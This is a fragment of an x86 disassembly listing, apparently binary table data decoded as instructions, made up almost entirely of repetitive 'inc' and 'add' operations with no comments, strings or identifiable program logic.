  43886d:	jno    0x43886e
  43886f:	add    BYTE PTR [eax],al
  438871:	pop    edi
  438872:	inc    DWORD PTR [eax]
  438874:	add    BYTE PTR [eax-0x1],dl
  438877:	add    BYTE PTR [eax],al
  438879:	inc    ebp
  43887a:	inc    DWORD PTR [eax]
  43887c:	add    BYTE PTR [ebx],bh
  43887e:	inc    DWORD PTR [eax]
  438880:	add    BYTE PTR [edi],dh
  438882:	inc    DWORD PTR [eax]
  438884:	add    BYTE PTR [eax-0x1],al
  438887:	add    BYTE PTR [eax],al
  438889:	cmp    edi,edi
  43888b:	add    BYTE PTR [eax],al
  43888d:	dec    edx
  43888e:	inc    DWORD PTR [eax]
  438890:	add    BYTE PTR [ebx-0x1],cl
  438893:	add    BYTE PTR [eax],al
  438895:	aas    
  438896:	inc    DWORD PTR [eax]
  438898:	add    BYTE PTR [edx],dh
  43889a:	inc    DWORD PTR [eax]
  43889c:	add    BYTE PTR [edi+edi*8+0x0],al
  4388a0:	add    BYTE PTR [edi+edi*8],bh
  4388a3:	add    BYTE PTR [eax],al
  4388a5:	inc    ebx
  4388a6:	inc    DWORD PTR [eax]
  4388a8:	add    BYTE PTR [edx-0x1],bl
  4388ab:	add    BYTE PTR [eax],al
  4388ad:	cmp    al,0xff
  4388af:	add    BYTE PTR [eax],al
  4388b1:	pop    eax
  4388b2:	inc    DWORD PTR [eax]
  4388b4:	add    BYTE PTR [eax-0x1],cl
  4388b7:	add    BYTE PTR [eax],al
  4388b9:	inc    DWORD PTR ss:[eax]
  4388bc:	add    BYTE PTR [edi],dh
  4388be:	inc    DWORD PTR [eax]
  4388c0:	add    BYTE PTR [edi+edi*8],dh
  4388c3:	add    BYTE PTR [eax],al
  4388c5:	inc    DWORD PTR ss:[eax]
  4388c8:	add    BYTE PTR [edi+edi*8+0x0],al
  4388cc:	add    BYTE PTR [esi],ch
  4388ce:	inc    DWORD PTR [eax]
  4388d0:	add    BYTE PTR ds:0x310000ff,ch
  4388d6:	inc    DWORD PTR [eax]
  4388d8:	add    BYTE PTR [ebx],dh
  4388da:	inc    DWORD PTR [eax]
  4388dc:	add    BYTE PTR [esi],ch
  4388de:	inc    DWORD PTR [eax]
  4388e0:	add    BYTE PTR ds:0x310000ff,ch
  4388e6:	inc    DWORD PTR [eax]
  4388e8:	add    BYTE PTR [ebx],ah
  4388ea:	inc    DWORD PTR [eax]
  4388ec:	add    BYTE PTR [esi],bh
  4388ee:	inc    DWORD PTR [eax]
  4388f0:	add    BYTE PTR [edi+edi*8],dh
  4388f3:	add    BYTE PTR [eax],al
  4388f5:	inc    ebx
  4388f6:	inc    DWORD PTR [eax]
  4388f8:	add    BYTE PTR ds:0x350000ff,dh
  4388fe:	inc    DWORD PTR [eax]
  438900:	add    BYTE PTR ds:0x3e0000ff,bh
  438906:	inc    DWORD PTR [eax]
  438908:	add    BYTE PTR [edx],bh
  43890a:	inc    DWORD PTR [eax]
  43890c:	add    BYTE PTR [edx],bh
  43890e:	inc    DWORD PTR [eax]
  438910:	add    BYTE PTR [edx-0x1],cl
  438913:	add    BYTE PTR [eax],al
  438915:	xor    edi,edi
  438917:	add    BYTE PTR [eax],al
  438919:	xor    edi,edi
  43891b:	add    BYTE PTR [eax],al
  43891d:	cmp    eax,0x440000ff
  438922:	inc    DWORD PTR [eax]
  438924:	add    BYTE PTR [edi],dh
  438926:	inc    DWORD PTR [eax]
  438928:	add    BYTE PTR [edi],bh
  43892a:	inc    DWORD PTR [eax]
  43892c:	add    BYTE PTR [ebx-0x1],al
  43892f:	push   es
  438930:	push   es
  438931:	cmp    edi,edi
  438933:	cmp    al,0x38
  438935:	dec    esp
  438936:	nop
	...
  438943:	mov    ds:0x910ea391,eax
  438948:	ins    DWORD PTR es:[edi],dx
  438949:	ins    DWORD PTR es:[edi],dx
  43894a:	push   cs
  43894b:	add    BYTE PTR [eax],al
  43894d:	add    BYTE PTR [eax],al
  43894f:	dec    eax
  438950:	dec    eax
  438951:	dec    eax
  438952:	pop    es
  438953:	sbb    DWORD PTR [ebx],edx
  438955:	sub    cl,ch
  438957:	add    BYTE PTR [eax],al
  438959:	das    
  43895a:	inc    DWORD PTR [eax]
  43895c:	add    BYTE PTR [ecx],ah
  43895e:	inc    DWORD PTR [eax]
  438960:	add    BYTE PTR ds:0x280000ff,ch
  438966:	inc    DWORD PTR [eax]
  438968:	add    BYTE PTR [eax],dh
  43896a:	inc    DWORD PTR [eax]
  43896c:	add    BYTE PTR [edx],ah
  43896e:	inc    DWORD PTR [eax]
  438970:	add    BYTE PTR [edi],ah
  438972:	inc    DWORD PTR [eax]
  438974:	add    BYTE PTR ds:0x2f0000ff,ah
  43897a:	inc    DWORD PTR [eax]
  43897c:	add    BYTE PTR [esi],bl
  43897e:	inc    DWORD PTR [eax]
  438980:	add    BYTE PTR [edi],bl
  438982:	inc    DWORD PTR [eax]
  438984:	add    BYTE PTR [ecx],ch
  438986:	inc    DWORD PTR [eax]
  438988:	add    BYTE PTR [eax],ah
  43898a:	inc    DWORD PTR [eax]
  43898c:	add    BYTE PTR ds:0x3e0000ff,dh
  438992:	inc    DWORD PTR [eax]
  438994:	add    BYTE PTR [esi],dh
  438996:	inc    DWORD PTR [eax]
  438998:	add    BYTE PTR [ebx],bh
  43899a:	inc    DWORD PTR [eax]
  43899c:	add    BYTE PTR ds:0x4c0000ff,bh
  4389a2:	inc    DWORD PTR [eax]
  4389a4:	add    BYTE PTR [edx],dh
  4389a6:	inc    DWORD PTR [eax]
  4389a8:	add    BYTE PTR [edi-0x1],al
  4389ab:	add    BYTE PTR [eax],al
  4389ad:	cmp    al,0xff
  4389af:	add    BYTE PTR [eax],al
  4389b1:	sub    bh,bh
  4389b3:	add    BYTE PTR [eax],al
  4389b5:	inc    ebp
  4389b6:	inc    DWORD PTR [eax]
  4389b8:	add    BYTE PTR [esi],ah
  4389ba:	inc    DWORD PTR [eax]
  4389bc:	add    BYTE PTR ds:0x340000ff,dh
  4389c2:	inc    DWORD PTR [eax]
  4389c4:	add    BYTE PTR [eax],bh
  4389c6:	inc    DWORD PTR [eax]
  4389c8:	add    BYTE PTR [esi],dh
  4389ca:	inc    DWORD PTR [eax]
  4389cc:	add    BYTE PTR [edi+edi*8],bh
  4389cf:	add    BYTE PTR [eax],al
  4389d1:	xor    edi,edi
  4389d3:	add    BYTE PTR [eax],al
  4389d5:	daa    
  4389d6:	inc    DWORD PTR [eax]
  4389d8:	add    BYTE PTR [edx],dh
  4389da:	inc    DWORD PTR [eax]
  4389dc:	add    BYTE PTR [edi],bh
  4389de:	inc    DWORD PTR [eax]
  4389e0:	add    BYTE PTR [ebx-0x1],dl
  4389e3:	add    BYTE PTR [eax],al
  4389e5:	inc    edx
  4389e6:	inc    DWORD PTR [eax]
  4389e8:	add    BYTE PTR [ecx],dh
  4389ea:	inc    DWORD PTR [eax]
  4389ec:	add    BYTE PTR [edx],dh
  4389ee:	inc    DWORD PTR [eax]
  4389f0:	add    BYTE PTR [ecx],bh
  4389f2:	inc    DWORD PTR [eax]
  4389f4:	add    BYTE PTR [edi+edi*8+0x0],cl
  4389f8:	add    BYTE PTR [esi-0x1],al
  4389fb:	add    BYTE PTR [eax],al
  4389fd:	push   esi
  4389fe:	inc    DWORD PTR [eax]
  438a00:	add    BYTE PTR [ebx-0x1],dl
  438a03:	add    BYTE PTR [eax],al
  438a05:	inc    ecx
  438a06:	inc    DWORD PTR [eax]
  438a08:	add    BYTE PTR [ecx-0x1],al
  438a0b:	add    BYTE PTR [eax],al
  438a0d:	cmp    al,0xff
  438a0f:	add    BYTE PTR [eax],al
  438a11:	xor    al,0xff
  438a13:	add    BYTE PTR [eax],al
  438a15:	xor    al,0xff
  438a17:	add    BYTE PTR [eax],al
  438a19:	dec    esp
  438a1a:	inc    DWORD PTR [eax]
  438a1c:	add    BYTE PTR [edi+edi*8],bh
  438a1f:	add    BYTE PTR [eax],al
  438a21:	cmp    bh,bh
  438a23:	add    BYTE PTR [eax],al
  438a25:	xor    edi,edi
  438a27:	add    BYTE PTR [eax],al
  438a29:	daa    
  438a2a:	inc    DWORD PTR [eax]
  438a2c:	add    BYTE PTR [esi],ch
  438a2e:	inc    DWORD PTR [eax]
  438a30:	add    BYTE PTR [ebp-0x1],al
  438a33:	add    BYTE PTR [eax],al
  438a35:	cmp    bh,bh
  438a37:	add    BYTE PTR [eax],al
  438a39:	push   ecx
  438a3a:	inc    DWORD PTR [eax]
  438a3c:	add    BYTE PTR [esi-0x1],dl
  438a3f:	add    BYTE PTR [eax],al
  438a41:	cmp    al,0xff
  438a43:	add    BYTE PTR [eax],al
  438a45:	das    
  438a46:	inc    DWORD PTR [eax]
  438a48:	add    BYTE PTR [esi],ch
  438a4a:	inc    DWORD PTR [eax]
  438a4c:	add    BYTE PTR [esi],dh
  438a4e:	inc    DWORD PTR [eax]
  438a50:	add    BYTE PTR [ecx-0x1],cl
  438a53:	add    BYTE PTR [eax],al
  438a55:	dec    ecx
  438a56:	inc    DWORD PTR [eax]
  438a58:	add    BYTE PTR [edi],dh
  438a5a:	inc    DWORD PTR [eax]
  438a5c:	add    BYTE PTR [edi],dh
  438a5e:	inc    DWORD PTR [eax]
  438a60:	add    BYTE PTR [ecx-0x1],cl
  438a63:	add    BYTE PTR [eax],al
  438a65:	cmp    bh,bh
  438a67:	add    BYTE PTR [eax],al
  438a69:	dec    eax
  438a6a:	inc    DWORD PTR [eax]
  438a6c:	add    BYTE PTR [ecx-0x1],dl
  438a6f:	add    BYTE PTR [eax],al
  438a71:	dec    edx
  438a72:	inc    DWORD PTR [eax]
  438a74:	add    BYTE PTR [ebx-0x1],dh
  438a77:	add    BYTE PTR [eax],al
  438a79:	imul   edi,edi,0xff430000
  438a7f:	add    BYTE PTR [eax],al
  438a81:	cmp    edi,edi
  438a83:	add    BYTE PTR [eax],al
  438a85:	inc    DWORD PTR ss:[eax]
  438a88:	add    BYTE PTR [edi+edi*8+0x0],cl
  438a8c:	add    BYTE PTR [edi+edi*8+0x0],al
  438a90:	add    BYTE PTR [esi],dh
  438a92:	inc    DWORD PTR [eax]
  438a94:	add    BYTE PTR [eax-0x1],cl
  438a97:	add    BYTE PTR [eax],al
  438a99:	cmp    eax,0x400000ff
  438a9e:	inc    DWORD PTR [eax]
  438aa0:	add    BYTE PTR [eax-0x1],al
  438aa3:	add    BYTE PTR [eax],al
  438aa5:	aaa    
  438aa6:	inc    DWORD PTR [eax]
  438aa8:	add    BYTE PTR [esi-0x1],bl
  438aab:	add    BYTE PTR [eax],al
  438aad:	xor    edi,edi
  438aaf:	add    BYTE PTR [eax],al
  438ab1:	cmp    bh,bh
  438ab3:	add    BYTE PTR [eax],al
  438ab5:	dec    edx
  438ab6:	inc    DWORD PTR [eax]
  438ab8:	add    BYTE PTR [esi],ch
  438aba:	inc    DWORD PTR [eax]
  438abc:	add    BYTE PTR [esi-0x1],al
  438abf:	add    BYTE PTR [eax],al
  438ac1:	inc    ebx
  438ac2:	inc    DWORD PTR [eax]
  438ac4:	add    BYTE PTR [edx],bh
  438ac6:	inc    DWORD PTR [eax]
  438ac8:	add    BYTE PTR [ebx-0x1],al
  438acb:	add    BYTE PTR [eax],al
  438acd:	inc    DWORD PTR ds:[eax]
  438ad0:	add    BYTE PTR [edi],ch
  438ad2:	inc    DWORD PTR [eax]
  438ad4:	add    BYTE PTR [ebp-0x1],al
  438ad7:	add    BYTE PTR [eax],al
  438ad9:	cmp    al,0xff
  438adb:	add    BYTE PTR [eax],al
  438add:	inc    DWORD PTR ss:[eax]
  438ae0:	add    BYTE PTR [esi],dh
  438ae2:	inc    DWORD PTR [eax]
  438ae4:	add    BYTE PTR [edx-0x1],al
  438ae7:	add    BYTE PTR [eax],al
  438ae9:	inc    DWORD PTR ss:[eax]
  438aec:	add    BYTE PTR [edi+edi*8+0x0],al
  438af0:	add    BYTE PTR [edx-0x1],al
  438af3:	add    BYTE PTR [eax],al
  438af5:	xor    eax,0x350000ff
  438afa:	inc    DWORD PTR [eax]
  438afc:	add    BYTE PTR [edx],dh
  438afe:	inc    DWORD PTR [eax]
  438b00:	add    BYTE PTR [edi+edi*8+0x0],al
  438b04:	add    BYTE PTR [edi],bh
  438b06:	inc    DWORD PTR [eax]
  438b08:	add    BYTE PTR [edi],bh
  438b0a:	inc    DWORD PTR [eax]
  438b0c:	add    BYTE PTR ds:0x330000ff,dh
  438b12:	inc    DWORD PTR [eax]
  438b14:	add    BYTE PTR [ecx],bh
  438b16:	inc    DWORD PTR [eax]
  438b18:	add    BYTE PTR [edi+edi*8],bh
  438b1b:	add    BYTE PTR [eax],al
  438b1d:	xor    bh,bh
  438b1f:	add    BYTE PTR [eax],al
  438b21:	inc    eax
  438b22:	inc    DWORD PTR [eax]
  438b24:	add    BYTE PTR [ebp-0x1],al
  438b27:	add    BYTE PTR [eax],al
  438b29:	aas    
  438b2a:	inc    DWORD PTR [eax]
  438b2c:	add    BYTE PTR ds:0x2d0000ff,ch
  438b32:	inc    DWORD PTR [eax]
  438b34:	add    BYTE PTR [edi+edi*8],ch
  438b37:	xor    DWORD PTR ds:0xb947,ebp
  438b3d:	add    BYTE PTR [eax],al
  438b3f:	add    BYTE PTR [eax],al
  438b41:	add    BYTE PTR [eax],al
  438b43:	mov    ds:0x910e9191,eax
  438b48:	ins    DWORD PTR es:[edi],dx
  438b49:	ins    DWORD PTR es:[edi],dx
  438b4a:	push   cs
  438b4b:	add    BYTE PTR [eax],al
  438b4d:	add    BYTE PTR [eax],al
  438b4f:	sub    DWORD PTR [ebx],esp
  438b51:	cmp    al,0xd7
  438b53:	add    BYTE PTR [eax],al
  438b55:	and    bh,bh
  438b57:	add    BYTE PTR [eax],al
  438b59:	xor    bh,bh
  438b5b:	add    BYTE PTR [eax],al
  438b5d:	xor    bh,bh
  438b5f:	add    BYTE PTR [eax],al
  438b61:	sub    bh,bh
  438b63:	add    BYTE PTR [eax],al
  438b65:	and    al,0xff
  438b67:	add    BYTE PTR [eax],al
  438b69:	xor    edi,edi
  438b6b:	add    BYTE PTR [eax],al
  438b6d:	xor    edi,edi
  438b6f:	add    BYTE PTR [eax],al
  438b71:	and    bh,bh
  438b73:	add    BYTE PTR [eax],al
  438b75:	sbb    al,0xff
  438b77:	add    BYTE PTR [eax],al
  438b79:	cmp    bh,bh
  438b7b:	add    BYTE PTR [eax],al
  438b7d:	and    bh,bh
  438b7f:	add    BYTE PTR [eax],al
  438b81:	sub    eax,0x350000ff
  438b86:	inc    DWORD PTR [eax]
  438b88:	add    BYTE PTR [ecx-0x1],al
  438b8b:	add    BYTE PTR [eax],al
  438b8d:	sub    al,0xff
  438b8f:	add    BYTE PTR [eax],al
  438b91:	xor    bh,bh
  438b93:	add    BYTE PTR [eax],al
  438b95:	cmp    al,0xff
  438b97:	add    BYTE PTR [eax],al
  438b99:	sbb    al,0xff
  438b9b:	add    BYTE PTR [eax],al
  438b9d:	xor    al,0xff
  438b9f:	add    BYTE PTR [eax],al
  438ba1:	xor    edi,edi
  438ba3:	add    BYTE PTR [eax],al
  438ba5:	sub    eax,0x490000ff
  438baa:	inc    DWORD PTR [eax]
  438bac:	add    BYTE PTR [edx],bh
  438bae:	inc    DWORD PTR [eax]
  438bb0:	add    BYTE PTR ds:0x4c0000ff,dh
  438bb6:	inc    DWORD PTR [eax]
  438bb8:	add    BYTE PTR [edi],bh
  438bba:	inc    DWORD PTR [eax]
  438bbc:	add    BYTE PTR ds:0x3d0000ff,bh
  438bc2:	inc    DWORD PTR [eax]
  438bc4:	add    BYTE PTR [ebx],bh
  438bc6:	inc    DWORD PTR [eax]
  438bc8:	add    BYTE PTR ds:0x420000ff,dh
  438bce:	inc    DWORD PTR [eax]
  438bd0:	add    BYTE PTR [eax-0x1],al
  438bd3:	add    BYTE PTR [eax],al
  438bd5:	cmp    bh,bh
  438bd7:	add    BYTE PTR [eax],al
  438bd9:	sub    edi,edi
  438bdb:	add    BYTE PTR [eax],al
  438bdd:	and    edi,edi
  438bdf:	add    BYTE PTR [eax],al
  438be1:	cmp    eax,0x4d0000ff
  438be6:	inc    DWORD PTR [eax]
  438be8:	add    BYTE PTR [esi],dh
  438bea:	inc    DWORD PTR [eax]
  438bec:	add    BYTE PTR [esi],dh
  438bee:	inc    DWORD PTR [eax]
  438bf0:	add    BYTE PTR [ecx-0x1],dl
  438bf3:	add    BYTE PTR [eax],al
  438bf5:	inc    DWORD PTR ss:[eax]
  438bf8:	add    BYTE PTR [ebp-0x1],al
  438bfb:	add    BYTE PTR [eax],al
  438bfd:	inc    DWORD PTR ds:[eax]
  438c00:	add    BYTE PTR [esi-0x1],al
  438c03:	add    BYTE PTR [eax],al
  438c05:	push   eax
  438c06:	inc    DWORD PTR [eax]
  438c08:	add    BYTE PTR [edx],dh
  438c0a:	inc    DWORD PTR [eax]
  438c0c:	add    BYTE PTR [edi],ah
  438c0e:	inc    DWORD PTR [eax]
  438c10:	add    BYTE PTR [ebx-0x1],dl
  438c13:	add    BYTE PTR [eax],al
  438c15:	cmp    eax,0x460000ff
  438c1a:	inc    DWORD PTR [eax]
  438c1c:	add    BYTE PTR [edx-0x1],cl
  438c1f:	add    BYTE PTR [eax],al
  438c21:	inc    ebp
  438c22:	inc    DWORD PTR [eax]
  438c24:	add    BYTE PTR [esi],ch
  438c26:	inc    DWORD PTR [eax]
  438c28:	add    BYTE PTR [esi-0x1],al
  438c2b:	add    BYTE PTR [eax],al
  438c2d:	inc    ecx
  438c2e:	inc    DWORD PTR [eax]
  438c30:	add    BYTE PTR [ecx],bh
  438c32:	inc    DWORD PTR [eax]
  438c34:	add    BYTE PTR [eax-0x1],al
  438c37:	add    BYTE PTR [eax],al
  438c39:	cmp    bh,bh
  438c3b:	add    BYTE PTR [eax],al
  438c3d:	inc    esp
  438c3e:	inc    DWORD PTR [eax]
  438c40:	add    BYTE PTR [esi-0x1],ah
  438c43:	add    BYTE PTR [eax],al
  438c45:	pop    edi
  438c46:	inc    DWORD PTR [eax]
  438c48:	add    BYTE PTR [edi-0x1],dl
  438c4b:	add    BYTE PTR [eax],al
  438c4d:	inc    edx
  438c4e:	inc    DWORD PTR [eax]
  438c50:	add    BYTE PTR [eax-0x1],al
  438c53:	add    BYTE PTR [eax],al
  438c55:	inc    DWORD PTR cs:[eax]
  438c58:	add    BYTE PTR [ebx],ch
  438c5a:	inc    DWORD PTR [eax]
  438c5c:	add    BYTE PTR [ecx],bh
  438c5e:	inc    DWORD PTR [eax]
  438c60:	add    BYTE PTR [edx],ch
  438c62:	inc    DWORD PTR [eax]
  438c64:	add    BYTE PTR [edi],ch
  438c66:	inc    DWORD PTR [eax]
  438c68:	add    BYTE PTR [esi-0x1],cl
  438c6b:	add    BYTE PTR [eax],al
  438c6d:	dec    edx
  438c6e:	inc    DWORD PTR [eax]
  438c70:	add    BYTE PTR [edi+edi*8],bh
  438c73:	add    BYTE PTR [eax],al
  438c75:	push   esp
  438c76:	inc    DWORD PTR [eax]
  438c78:	add    BYTE PTR [eax-0x1],ah
  438c7b:	add    BYTE PTR [eax],al
  438c7d:	inc    DWORD PTR fs:[eax]
  438c80:	add    BYTE PTR [edi-0x1],bl
  438c83:	add    BYTE PTR [eax],al
  438c85:	inc    ecx
  438c86:	inc    DWORD PTR [eax]
  438c88:	add    BYTE PTR [ebp-0x1],cl
  438c8b:	add    BYTE PTR [eax],al
  438c8d:	cmp    bh,bh
  438c8f:	add    BYTE PTR [eax],al
  438c91:	cmp    edi,edi
  438c93:	add    BYTE PTR [eax],al
  438c95:	inc    esi
  438c96:	inc    DWORD PTR [eax]
  438c98:	add    BYTE PTR [edi+edi*8+0x0],al
  438c9c:	add    BYTE PTR [eax-0x1],al
  438c9f:	add    BYTE PTR [eax],al
  438ca1:	xor    edi,edi
  438ca3:	add    BYTE PTR [eax],al
  438ca5:	cmp    edi,edi
  438ca7:	add    BYTE PTR [eax],al
  438ca9:	dec    ecx
  438caa:	inc    DWORD PTR [eax]
  438cac:	add    BYTE PTR [ebx],bh
  438cae:	inc    DWORD PTR [eax]
  438cb0:	add    BYTE PTR [esi-0x1],cl
  438cb3:	add    BYTE PTR [eax],al
  438cb5:	cmp    eax,0x350000ff
  438cba:	inc    DWORD PTR [eax]
  438cbc:	add    BYTE PTR [ebx],dh
  438cbe:	inc    DWORD PTR [eax]
  438cc0:	add    BYTE PTR [ebx],ch
  438cc2:	inc    DWORD PTR [eax]
  438cc4:	add    BYTE PTR [ecx],dh
  438cc6:	inc    DWORD PTR [eax]
  438cc8:	add    BYTE PTR [edi],dh
  438cca:	inc    DWORD PTR [eax]
  438ccc:	add    BYTE PTR [esi],dh
  438cce:	inc    DWORD PTR [eax]
  438cd0:	add    BYTE PTR [edx],bh
  438cd2:	inc    DWORD PTR [eax]
  438cd4:	add    BYTE PTR [ecx-0x1],al
  438cd7:	add    BYTE PTR [eax],al
  438cd9:	inc    esp
  438cda:	inc    DWORD PTR [eax]
  438cdc:	add    BYTE PTR [edi],ch
  438cde:	inc    DWORD PTR [eax]
  438ce0:	add    BYTE PTR [edx],dh
  438ce2:	inc    DWORD PTR [eax]
  438ce4:	add    BYTE PTR [edx],dh
  438ce6:	inc    DWORD PTR [eax]
  438ce8:	add    BYTE PTR [edx],bh
  438cea:	inc    DWORD PTR [eax]
  438cec:	add    BYTE PTR [edi+edi*8],ah
  438cef:	add    BYTE PTR [eax],al
  438cf1:	dec    ecx
  438cf2:	inc    DWORD PTR [eax]
  438cf4:	add    BYTE PTR [ebx],bh
  438cf6:	inc    DWORD PTR [eax]
  438cf8:	add    BYTE PTR [ebx],dh
  438cfa:	inc    DWORD PTR [eax]
  438cfc:	add    BYTE PTR [edi+edi*8],ch
  438cff:	add    BYTE PTR [eax],al
  438d01:	cmp    eax,0x450000ff
  438d06:	inc    DWORD PTR [eax]
  438d08:	add    BYTE PTR [ebp-0x1],al
  438d0b:	add    BYTE PTR [eax],al
  438d0d:	cmp    edi,edi
  438d0f:	add    BYTE PTR [eax],al
  438d11:	cmp    bh,bh
  438d13:	add    BYTE PTR [eax],al
  438d15:	inc    edx
  438d16:	inc    DWORD PTR [eax]
  438d18:	add    BYTE PTR ds:0x440000ff,bh
  438d1e:	inc    DWORD PTR [eax]
  438d20:	add    BYTE PTR [eax-0x1],al
  438d23:	add    BYTE PTR [eax],al
  438d25:	dec    edx
  438d26:	inc    DWORD PTR [eax]
  438d28:	add    BYTE PTR [ebp-0x1],al
  438d2b:	add    BYTE PTR [eax],al
  438d2d:	cmp    bh,bh
  438d2f:	add    BYTE PTR [eax],al
  438d31:	xor    eax,0x2c0000ff
  438d36:	inc    DWORD PTR [eax]
  438d38:	add    BYTE PTR [ecx],bh
  438d3a:	inc    DWORD PTR [ebx+0x3f]
  438d3d:	pop    eax
  438d3e:	nop
  438d3f:	add    BYTE PTR [eax],al
  438d41:	add    BYTE PTR [eax],al
  438d43:	enter  0xb6b6,0xe
  438d47:	xchg   ecx,eax
  438d48:	ins    DWORD PTR es:[edi],dx
  438d49:	jg     0x438d59
  438d4b:	xor    ch,BYTE PTR ds:0x933c
  438d51:	sbb    edi,edi
  438d53:	add    BYTE PTR [eax],al
  438d55:	push   ds
  438d56:	inc    DWORD PTR [eax]
  438d58:	add    BYTE PTR [edi+edi*8],ah
  438d5b:	add    BYTE PTR [eax],al
  438d5d:	sub    bh,bh
  438d5f:	add    BYTE PTR [eax],al
  438d61:	aaa    
  438d62:	inc    DWORD PTR [eax]
  438d64:	add    BYTE PTR [edi+edi*8],ah
  438d67:	add    BYTE PTR [eax],al
  438d69:	sbb    bh,bh
  438d6b:	add    BYTE PTR [eax],al
  438d6d:	and    edi,edi
  438d6f:	add    BYTE PTR [eax],al
  438d71:	and    edi,edi
  438d73:	add    BYTE PTR [eax],al
  438d75:	pop    ds
  438d76:	inc    DWORD PTR [eax]
  438d78:	add    BYTE PTR [edi],ah
  438d7a:	inc    DWORD PTR [eax]
  438d7c:	add    BYTE PTR [edx],ah
  438d7e:	inc    DWORD PTR [eax]
  438d80:	add    BYTE PTR [esi],ah
  438d82:	inc    DWORD PTR [eax]
  438d84:	add    BYTE PTR [ebx],ah
  438d86:	inc    DWORD PTR [eax]
  438d88:	add    BYTE PTR [edi+edi*8],ah
  438d8b:	add    BYTE PTR [eax],al
  438d8d:	and    al,0xff
  438d8f:	add    BYTE PTR [eax],al
  438d91:	and    edi,edi
  438d93:	add    BYTE PTR [eax],al
  438d95:	sub    edi,edi
  438d97:	add    BYTE PTR [eax],al
  438d99:	inc    esi
  438d9a:	inc    DWORD PTR [eax]
  438d9c:	add    BYTE PTR [eax],ch
  438d9e:	inc    DWORD PTR [eax]
  438da0:	add    BYTE PTR [ecx-0x1],al
  438da3:	add    BYTE PTR [eax],al
  438da5:	aaa    
  438da6:	inc    DWORD PTR [eax]
  438da8:	add    BYTE PTR [edx],bh
  438daa:	inc    DWORD PTR [eax]
  438dac:	add    BYTE PTR [edx-0x1],dl
  438daf:	add    BYTE PTR [eax],al
  438db1:	cmp    edi,edi
  438db3:	add    BYTE PTR [eax],al
  438db5:	dec    edi
  438db6:	inc    DWORD PTR [eax]
  438db8:	add    BYTE PTR [edi+edi*8],dh
  438dbb:	add    BYTE PTR [eax],al
  438dbd:	xor    eax,0x3b0000ff
  438dc2:	inc    DWORD PTR [eax]
  438dc4:	add    BYTE PTR [ecx],dh
  438dc6:	inc    DWORD PTR [eax]
  438dc8:	add    BYTE PTR ds:0x380000ff,bh
  438dce:	inc    DWORD PTR [eax]
  438dd0:	add    BYTE PTR ds:0x510000ff,ch
  438dd6:	inc    DWORD PTR [eax]
  438dd8:	add    BYTE PTR [edx-0x1],cl
  438ddb:	add    BYTE PTR [eax],al
  438ddd:	cmp    bh,bh
  438ddf:	add    BYTE PTR [eax],al
  438de1:	inc    DWORD PTR ds:[eax]
  438de4:	add    BYTE PTR ds:0x4b0000ff,bh
  438dea:	inc    DWORD PTR [eax]
  438dec:	add    BYTE PTR [esi-0x1],al
  438def:	add    BYTE PTR [eax],al
  438df1:	inc    esi
  438df2:	inc    DWORD PTR [eax]
  438df4:	add    BYTE PTR [edi+edi*8+0x0],cl
  438df8:	add    BYTE PTR [ecx],dh
  438dfa:	inc    DWORD PTR [eax]
  438dfc:	add    BYTE PTR [edi+edi*8+0x0],al
  438e00:	add    BYTE PTR [ebx],bh
  438e02:	inc    DWORD PTR [eax]
  438e04:	add    BYTE PTR [ecx-0x1],cl
  438e07:	add    BYTE PTR [eax],al
  438e09:	dec    eax
  438e0a:	inc    DWORD PTR [eax]
  438e0c:	add    BYTE PTR [ebx],ch
  438e0e:	inc    DWORD PTR [eax]
  438e10:	add    BYTE PTR ds:0x320000ff,ch
  438e16:	inc    DWORD PTR [eax]
  438e18:	add    BYTE PTR ds:0x480000ff,bh
  438e1e:	inc    DWORD PTR [eax]
  438e20:	add    BYTE PTR [ebp-0x1],dl
  438e23:	add    BYTE PTR [eax],al
  438e25:	pop    eax
  438e26:	inc    DWORD PTR [eax]
  438e28:	add    BYTE PTR [edi-0x1],cl
  438e2b:	add    BYTE PTR [eax],al
  438e2d:	push   edx
  438e2e:	inc    DWORD PTR [eax]
  438e30:	add    BYTE PTR [esi-0x1],dl
  438e33:	add    BYTE PTR [eax],al
  438e35:	das    
  438e36:	inc    DWORD PTR [eax]
  438e38:	add    BYTE PTR [ebx],dh
  438e3a:	inc    DWORD PTR [eax]
  438e3c:	add    BYTE PTR [eax],dh
  438e3e:	inc    DWORD PTR [eax]
  438e40:	add    BYTE PTR [edx-0x1],al
  438e43:	add    BYTE PTR [eax],al
  438e45:	xor    eax,0x3c0000ff
  438e4a:	inc    DWORD PTR [eax]
  438e4c:	add    BYTE PTR [edx-0x1],bl
  438e4f:	add    BYTE PTR [eax],al
  438e51:	push   esi
  438e52:	inc    DWORD PTR [eax]
  438e54:	add    BYTE PTR [edi-0x1],dl
  438e57:	add    BYTE PTR [eax],al
  438e59:	cmp    edi,edi
  438e5b:	add    BYTE PTR [eax],al
  438e5d:	push   esi
  438e5e:	inc    DWORD PTR [eax]
  438e60:	add    BYTE PTR [ebp-0x1],cl
  438e63:	add    BYTE PTR [eax],al
  438e65:	inc    DWORD PTR cs:[eax]
  438e68:	add    BYTE PTR [ebp-0x1],al
  438e6b:	add    BYTE PTR [eax],al
  438e6d:	dec    edx
  438e6e:	inc    DWORD PTR [eax]
  438e70:	add    BYTE PTR [eax-0x1],dl
  438e73:	add    BYTE PTR [eax],al
  438e75:	push   eax
  438e76:	inc    DWORD PTR [eax]
  438e78:	add    BYTE PTR [edi],bh
  438e7a:	inc    DWORD PTR [eax]
  438e7c:	add    BYTE PTR [ebp-0x1],bl
  438e7f:	add    BYTE PTR [eax],al
  438e81:	pop    ebp
  438e82:	inc    DWORD PTR [eax]
  438e84:	add    BYTE PTR [esi-0x1],ah
  438e87:	add    BYTE PTR [eax],al
  438e89:	pop    eax
  438e8a:	inc    DWORD PTR [eax]
  438e8c:	add    BYTE PTR ds:0x3f0000ff,ch
  438e92:	inc    DWORD PTR [eax]
  438e94:	add    BYTE PTR [edi],bh
  438e96:	inc    DWORD PTR [eax]
  438e98:	add    BYTE PTR [eax-0x1],al
  438e9b:	add    BYTE PTR [eax],al
  438e9d:	sub    al,0xff
  438e9f:	add    BYTE PTR [eax],al
  438ea1:	sub    edi,edi
  438ea3:	add    BYTE PTR [eax],al
  438ea5:	aaa    
  438ea6:	inc    DWORD PTR [eax]
  438ea8:	add    BYTE PTR [edx],bh
  438eaa:	inc    DWORD PTR [eax]
  438eac:	add    BYTE PTR [eax-0x1],al
  438eaf:	add    BYTE PTR [eax],al
  438eb1:	aas    
  438eb2:	inc    DWORD PTR [eax]
  438eb4:	add    BYTE PTR [ecx],bh
